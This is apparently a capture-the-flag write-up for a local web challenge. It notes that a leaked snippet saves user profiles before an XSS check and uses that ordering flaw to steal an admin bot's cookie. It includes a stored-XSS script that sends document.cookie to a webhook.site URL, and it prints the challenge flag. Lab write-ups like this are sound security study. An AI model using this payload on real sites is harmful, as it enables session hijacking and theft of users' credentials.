# Chall Description 

You’ve received an anonymous tip from the Airship Mail Delivery Company claiming that a seemingly legitimate website is actually a front for trading stolen submarine mechanical parts. Yeah, that’s oddly specific...

The localhost port is 3000. Take a closer look and see if you can uncover anything suspicious. The flag to find is the bot's cookie.

# Steps

On the website their is a leak about a part of the source code :

```js
  await newProfile.save();
  const isXSSDetected = samitizeJSON(profileData, res);
  if (isXSSDetected) return;
  console.log('Profile created: ', profileData);
  res.redirect('/user?token=${token}');
} catch (err) {
  console.error('Error while creating profile :', err);
  res.status(500).send('Error while creating profile.')
}
```

We can see that profile is saved before sanitaze, so even if it's fail it will save the profile.

So with `webhook.site` and this xss payload :

```js
<script>document.location = "https://webhook.site/XXXXXXXXXXXXXXXXXXXXXXXX/" + document.cookie</script>
```

We just have to create an article and wait for the admin to verify it and there is our flag :

`HACKDAY{0rd3R_M4tteRs_In_Ur_C0d3!!!!}`
